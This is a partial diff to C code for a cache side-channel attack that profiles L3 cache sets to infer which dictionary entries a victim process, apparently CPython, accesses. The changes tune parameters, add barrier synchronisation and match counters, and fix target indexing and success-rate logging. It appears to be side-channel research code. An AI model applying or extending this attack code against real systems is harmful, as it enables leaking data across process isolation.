@@ -17,18 +17,18 @@ static uint64_t probe_time_arr[cache_line_count][profile_samples];
 static uint64_t sample_tsc_arr[cache_line_count][profile_samples];
 static uint64_t* sample_tsc[cache_line_count];
 static uint64_t* probe_time[cache_line_count];
-static const int dict_entries = 1 << 16;
-static const int target_entries = 4;
+static const int dict_entries = 1 << 6;
+static const int target_entries = 2;
 static const int dict_iterations = 32;
-static const int factor = 2;
+static const float factor = 0.75;
 static const int threshold = 8;
 
-static const int attack_iterations = 4;
+static const int attack_iterations = 10;
 
 u32* profiles = NULL;
 
 static bool check(u32 ctr) {
-    return (ctr >= dict_iterations / factor) && (ctr <= factor * dict_iterations);
+    return (ctr >= dict_iterations * factor) && (ctr <= dict_iterations / factor);
 }
 
 static u32 cpython_PS_profile_once(EVSet* evset,
@@ -83,12 +83,13 @@ static void profile(int i, int j) {
             sync_ctx_set_action(SYNC_CTX_PROBE);
             *sync_ctx.data = i;
 
-            u32 res = PS_profile_once(evset, 0, profile_samples, max_exec_cycles, sample_tsc, probe_time);
+            pthread_barrier_wait(sync_ctx.barrier);
+
+            u32 res = cpython_PS_profile_once(evset, 0, max_exec_cycles);
+
+            pthread_barrier_wait(sync_ctx.barrier);
 
             profiles[j * cfg->l3.sets + l3_set] = res;
-
-            //dump_profiling_trace(dump_dir, j * cfg->l3.sets + l3_set, sample_tsc, probe_time,
-            //                     cache_line_count, profile_samples);
         } else {
             log_error("Cannot get evset for set %d", l3_set);
         }
@@ -99,7 +100,9 @@ static int infer(int j) {
     config_t *cfg = get_config();
 
     u32 unique[target_entries];
+    u32 matching[target_entries];
     memset(unique, 0, target_entries * sizeof(u32));
+    memset(matching, 0, target_entries * sizeof(u32));
 
     for (int l3 = 0; l3 < cfg->l3.sets; ++l3) {
         u32 ctr = profiles[j * cfg->l3.sets + l3];
@@ -112,6 +115,10 @@ static int infer(int j) {
             if (c != t) {
                 unique[i]++;
             }
+
+            if (c && t) {
+                matching[i]++;
+            }
         }
     }
 
@@ -120,6 +127,7 @@ static int infer(int j) {
 
     for (int i = 0; i < target_entries; ++i) {
         log_info("%d: unique[%d] = %u", j, i, unique[i]);
+        log_info("%d: matching[%d] = %u", j, i, matching[i]);
         unique_sum += unique[i];
         if (index != -1) {
             if (unique[i] < unique[index]) {
@@ -222,7 +230,7 @@ int main(int argc, char* argv[]) {
     	log_info("iteration: %d", i);
     	// Hit
     	int h = rand() % target_entries;
-    	profile(targets[i], target_entries);
+    	profile(targets[h], target_entries);
 
      	// Miss
      	int nh = 0;
@@ -239,7 +247,7 @@ int main(int argc, char* argv[]) {
        	} while (found);
       	profile(nh, target_entries + 1);
 
-      	log_info("Hit at index %d (%d)", targets[i], i);
+      	log_info("Hit at index %d (%d)", targets[h], h);
       	int hi = infer(target_entries);
         if (hi != -1) {
             target_access++;
@@ -262,9 +270,9 @@ int main(int argc, char* argv[]) {
         }
     }
 
-    log_info("Target success rate: %d", target_success / attack_iterations);
-    log_info("Target access success rate: %d", target_access / attack_iterations);
-    log_info("Access success rate: %d", access_success / attack_iterations);
+    log_info("Target success rate: %f", (float)target_success / attack_iterations);
+    log_info("Target access success rate: %f", (float)target_access / attack_iterations);
+    log_info("Access success rate: %f", (float)access_success / attack_iterations);
 
     sync_ctx_set_action(SYNC_CTX_EXIT);
     pthread_barrier_wait(sync_ctx.barrier);
